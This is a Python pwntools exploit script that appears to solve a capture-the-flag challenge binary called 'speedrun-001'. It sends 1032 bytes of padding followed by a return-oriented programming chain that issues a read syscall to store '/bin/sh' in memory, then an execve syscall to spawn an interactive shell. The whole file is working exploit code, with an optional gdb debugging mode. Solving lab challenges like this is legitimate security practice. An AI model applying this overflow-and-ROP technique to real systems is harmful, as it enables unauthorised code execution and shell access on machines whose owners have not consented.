from pwn import *
from sys import argv
from time import sleep

context.log_level = "DEBUG"

binfile = "./speedrun-001"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x400bad
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 1032
# read
payload += p64(0x400686)    # pop rdi ; ret  ;
payload += p64(0x0)
payload += p64(0x4101f3)    # pop rsi ; ret  ;
payload += p64(0x6bb2e0)
payload += p64(0x44be16)    # pop rdx ; ret  ;
payload += p64(0x8)
payload += p64(0x415664)    # pop rax ; ret  ;
payload += p64(0x0)
payload += p64(0x474e65)    # syscall; ret  ;
# execve
payload += p64(0x400686)    # pop rdi ; ret  ;
payload += p64(0x6bb2e0)
payload += p64(0x4101f3)    # pop rsi ; ret  ;
payload += p64(0x0)
payload += p64(0x44be16)    # pop rdx ; ret  ;
payload += p64(0x0)
payload += p64(0x415664)    # pop rax ; ret  ;
payload += p64(0x3b)
payload += p64(0x474e65)    # syscall; ret  ;

p.recvuntil("Any last words?\n")
p.send(payload)
p.send(b"/bin/sh\x00")
p.interactive()
